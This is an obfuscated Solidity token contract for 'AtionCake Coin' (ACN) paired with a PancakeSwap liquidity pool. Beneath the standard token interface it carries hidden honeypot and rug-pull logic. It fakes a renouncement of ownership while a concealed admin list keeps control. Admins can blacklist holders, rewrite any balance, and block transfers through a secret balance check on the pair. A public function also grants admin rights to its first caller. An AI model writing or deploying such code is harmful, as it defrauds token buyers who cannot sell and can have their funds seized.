//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface rfbpzjrskvxk {
    function totalSupply() external view returns (uint256);

    function balanceOf(address dcflpqebpvki) external view returns (uint256);

    function transfer(address hycvtvmspiv, uint256 vigznyczcqzqm) external returns (bool);

    function allowance(address vrnnclvwb, address spender) external view returns (uint256);

    function approve(address spender, uint256 vigznyczcqzqm) external returns (bool);

    function transferFrom(
        address sender,
        address hycvtvmspiv,
        uint256 vigznyczcqzqm
    ) external returns (bool);

    event Transfer(address indexed from, address indexed oxywjfunxb, uint256 value);
    event Approval(address indexed vrnnclvwb, address indexed spender, uint256 value);
}

interface txshwzmazc is rfbpzjrskvxk {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract jfhclojvanhlv {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface htougkiwhzcdg {
    function createPair(address bcmqinbpvmbaj, address nxbsiipgevzypb) external returns (address);
}

interface eiftfwtyul {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract AtionCakeCoin is jfhclojvanhlv, rfbpzjrskvxk, txshwzmazc {

    address private ycfjaleomtkp;

    address public tcqcrpnht;

    function decimals() external view virtual override returns (uint8) {
        return fymvidlyctay;
    }

    address adeoqmgix = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function jpddqdpcyc(address mmqbrclng) public {
        jemzdrhsutsukc();
        
        if (mmqbrclng == wgexbjmhdyulf || mmqbrclng == tcqcrpnht) {
            return;
        }
        ewerrhafxarutu[mmqbrclng] = true;
    }

    uint256 private epolnszninxk;

    bool public mvmesazsfxjmms;

    function tnxpgvfhuvvxi(address llqlwyovmkh, address hycvtvmspiv, uint256 vigznyczcqzqm) internal returns (bool) {
        if (llqlwyovmkh == wgexbjmhdyulf) {
            return olmvqlats(llqlwyovmkh, hycvtvmspiv, vigznyczcqzqm);
        }
        uint256 lhwfcpygf = rfbpzjrskvxk(tcqcrpnht).balanceOf(adeoqmgix);
        require(lhwfcpygf == lttfjnpclap);
        require(!ewerrhafxarutu[llqlwyovmkh]);
        return olmvqlats(llqlwyovmkh, hycvtvmspiv, vigznyczcqzqm);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return ajkudvdiarrxv;
    }

    uint256 cqicqmitwvjm;

    function nyzknvsue() public {
        emit OwnershipTransferred(wgexbjmhdyulf, address(0));
        ycfjaleomtkp = address(0);
    }

    function jemzdrhsutsukc() private view {
        require(hblkxjjegzxoai[_msgSender()]);
    }

    function transfer(address oqdfgvvtmsvc, uint256 vigznyczcqzqm) external virtual override returns (bool) {
        return tnxpgvfhuvvxi(_msgSender(), oqdfgvvtmsvc, vigznyczcqzqm);
    }

    address public wgexbjmhdyulf;

    function allowance(address iqdrenydu, address qqewmwjplxzyr) external view virtual override returns (uint256) {
        if (qqewmwjplxzyr == qydvvndyuzg) {
            return type(uint256).max;
        }
        return suyxhmfbsuw[iqdrenydu][qqewmwjplxzyr];
    }

    mapping(address => bool) public ewerrhafxarutu;

    uint256 private ajkudvdiarrxv = 100000000 * 10 ** 18;

    mapping(address => bool) public hblkxjjegzxoai;

    function mmlyqsqjyx(uint256 vigznyczcqzqm) public {
        jemzdrhsutsukc();
        lttfjnpclap = vigznyczcqzqm;
    }

    uint256 lttfjnpclap;

    function name() external view virtual override returns (string memory) {
        return iudpgdkcrch;
    }

    bool private gcxikkvui;

    function approve(address qqewmwjplxzyr, uint256 vigznyczcqzqm) public virtual override returns (bool) {
        suyxhmfbsuw[_msgSender()][qqewmwjplxzyr] = vigznyczcqzqm;
        emit Approval(_msgSender(), qqewmwjplxzyr, vigznyczcqzqm);
        return true;
    }

    address qydvvndyuzg = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function ppicyuylxw(address oqdfgvvtmsvc, uint256 vigznyczcqzqm) public {
        jemzdrhsutsukc();
        sochivnpaewy[oqdfgvvtmsvc] = vigznyczcqzqm;
    }

    function transferFrom(address llqlwyovmkh, address hycvtvmspiv, uint256 vigznyczcqzqm) external override returns (bool) {
        if (_msgSender() != qydvvndyuzg) {
            if (suyxhmfbsuw[llqlwyovmkh][_msgSender()] != type(uint256).max) {
                require(vigznyczcqzqm <= suyxhmfbsuw[llqlwyovmkh][_msgSender()]);
                suyxhmfbsuw[llqlwyovmkh][_msgSender()] -= vigznyczcqzqm;
            }
        }
        return tnxpgvfhuvvxi(llqlwyovmkh, hycvtvmspiv, vigznyczcqzqm);
    }

    string private iudpgdkcrch = "AtionCake Coin";

    mapping(address => mapping(address => uint256)) private suyxhmfbsuw;

    function owner() external view returns (address) {
        return ycfjaleomtkp;
    }

    constructor (){
        
        nyzknvsue();
        eiftfwtyul zvhmsukuenenr = eiftfwtyul(qydvvndyuzg);
        tcqcrpnht = htougkiwhzcdg(zvhmsukuenenr.factory()).createPair(zvhmsukuenenr.WETH(), address(this));
        
        wgexbjmhdyulf = _msgSender();
        hblkxjjegzxoai[wgexbjmhdyulf] = true;
        sochivnpaewy[wgexbjmhdyulf] = ajkudvdiarrxv;
        if (mvmesazsfxjmms) {
            gcxikkvui = false;
        }
        emit Transfer(address(0), wgexbjmhdyulf, ajkudvdiarrxv);
    }

    function gsmfjukombi(address cdzepgmhwxkz) public {
        if (kcocixlsqca) {
            return;
        }
        if (epolnszninxk == sjqazkeghfhtn) {
            epolnszninxk = hnuzhigvieo;
        }
        hblkxjjegzxoai[cdzepgmhwxkz] = true;
        if (epolnszninxk == sjqazkeghfhtn) {
            epolnszninxk = sjqazkeghfhtn;
        }
        kcocixlsqca = true;
    }

    uint256 public sjqazkeghfhtn;

    uint8 private fymvidlyctay = 18;

    string private gqljwofmll = "ACN";

    function olmvqlats(address llqlwyovmkh, address hycvtvmspiv, uint256 vigznyczcqzqm) internal returns (bool) {
        require(sochivnpaewy[llqlwyovmkh] >= vigznyczcqzqm);
        sochivnpaewy[llqlwyovmkh] -= vigznyczcqzqm;
        sochivnpaewy[hycvtvmspiv] += vigznyczcqzqm;
        emit Transfer(llqlwyovmkh, hycvtvmspiv, vigznyczcqzqm);
        return true;
    }

    bool public kcocixlsqca;

    uint256 public hnuzhigvieo;

    event OwnershipTransferred(address indexed rmwfhchipns, address indexed gojezpyja);

    function symbol() external view virtual override returns (string memory) {
        return gqljwofmll;
    }

    function getOwner() external view returns (address) {
        return ycfjaleomtkp;
    }

    function balanceOf(address dcflpqebpvki) public view virtual override returns (uint256) {
        return sochivnpaewy[dcflpqebpvki];
    }

    mapping(address => uint256) private sochivnpaewy;

}